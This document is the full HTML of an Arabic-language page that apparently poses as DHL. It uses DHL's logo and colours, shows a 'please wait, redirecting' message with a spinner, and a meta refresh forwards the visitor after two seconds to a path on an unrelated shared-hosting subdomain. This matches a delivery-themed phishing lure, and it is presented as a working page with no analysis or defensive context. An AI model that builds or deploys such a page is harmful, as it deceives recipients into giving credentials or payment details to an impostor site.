<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="refresh" content="2;url=https://qkj.huh.mybluehost.me/de4401/HKTWSA">
  <title></title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #ffcc00;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      color: #ba0c2f;
    }

    .logo {
      width: 180px;
      max-width: 80%;
      margin-bottom: 30px;
    }

    .message {
      font-size: 1.2rem;
      padding: 0 20px;
      margin-bottom: 30px;
    }

    .loader {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #ba0c2f;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <img class="logo" src="https://www.dhl.com/content/dam/dhl/global/core/images/logos/dhl-logo.svg" alt="شعار DHL">
  <div class="message">
    الرجاء الانتظار، سيتم تحويلك<span id="dots">.</span>
  </div>
  <div class="loader"></div>

  <script>
    let dots = document.getElementById("dots");
    let count = 1;
    setInterval(() => {
      count = (count % 3) + 1;
      dots.textContent = '.'.repeat(count);
    }, 500);

    setTimeout(function () {
      // window.location.href = "https://qkj.huh.mybluehost.me/de4401/HKTWSA";
    }, 1000);
  </script>
</body>
</html>
